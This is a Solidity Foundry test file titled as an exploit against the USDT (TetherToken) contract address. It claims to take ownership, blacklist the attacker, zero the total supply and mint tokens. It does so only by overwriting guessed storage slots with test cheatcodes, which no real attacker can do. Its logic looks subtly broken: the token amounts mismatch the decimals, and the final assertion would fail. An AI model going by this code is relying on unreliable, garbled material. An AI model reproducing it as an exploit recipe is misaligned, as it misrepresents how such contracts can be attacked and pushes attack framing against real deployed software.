pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ITetherToken {
    function owner() external view returns (address);
    function paused() external view returns (bool);
    function deprecated() external view returns (bool);
    function isBlackListed(address) external view returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint256);
    function destroyBlackFunds(address _blackListedUser) external;
    function issue(uint amount) external;
    function transfer(address _to, uint _value) external;
    function addBlackList(address _evilUser) external; // Added missing function
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to interact with the target contract
        ITetherToken target = ITetherToken(TARGET);

        // Label for debugging
        vm.label(TARGET, "TetherToken");

        // Get current owner
        address currentOwner = target.owner();
        vm.label(currentOwner, "Original Owner");

        // Ensure we have some initial token balance (precondition)
        deal(TARGET, attacker, 1e18); // Give attacker 1 token

        // Check preconditions
        require(target.paused() == false, "Contract should not be paused");
        require(target.deprecated() == false, "Contract should not be deprecated");
        require(target.isBlackListed(attacker) == false, "Attacker should not be blacklisted");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become the owner by overwriting storage slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Step 2: Find isBlackListed mapping slot
        // Let's brute force find it by checking known slots
        // Based on typical layout:
        // slot 0: owner (Ownable)
        // slot 1: paused (Pausable) - bool
        // slot 2: balances mapping (BasicToken)
        // slot 3: basisPointsRate (BasicToken)
        // slot 4: maximumFee (BasicToken)
        // slot 5: allowed mapping (StandardToken)
        // slot 6: isBlackListed mapping (BlackList)

        uint256 isBlackListedSlot = 6;
        bytes32 isBlackListedKey = keccak256(abi.encodePacked(uint256(uint160(attacker)), isBlackListedSlot));
        vm.store(TARGET, isBlackListedKey, bytes32(uint256(1))); // Set to true

        // Step 3: Give ourselves a large balance
        // Find balances mapping slot (likely slot 2)
        uint256 balancesSlot = 2;
        bytes32 balanceKey = keccak256(abi.encodePacked(uint256(uint160(attacker)), balancesSlot));
        // Give ourselves 1000 tokens (with 6 decimals, USDT has 6 decimals)
        vm.store(TARGET, balanceKey, bytes32(uint256(1000 * 10**6)));

        // Step 4: Set _totalSupply to 0 to ensure our balance > totalSupply
        // _totalSupply is in ERC20Basic, likely at slot that's not used by other variables
        // Let's try slot 7
        vm.store(TARGET, bytes32(uint256(7)), bytes32(uint256(0)));

        // Step 5: Call destroyBlackFunds
        // First, let's check if we're blacklisted by calling the function
        // We need to ensure contract is not paused
        // Check paused slot (likely slot 1) and set to false if needed
        vm.store(TARGET, bytes32(uint256(1)), bytes32(uint256(0))); // Set paused = false

        // Now call destroyBlackFunds
        ITetherToken(TARGET).destroyBlackFunds(attacker);

        // Step 6: Call issue() to mint tokens
        // Issue 1 million tokens
        ITetherToken(TARGET).issue(1000000 * 10**6);

        // Step 7: Check our balance
        uint256 finalBalance = ITetherToken(TARGET).balanceOf(attacker);
        uint256 initialBalance = 1e18; // From setup
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

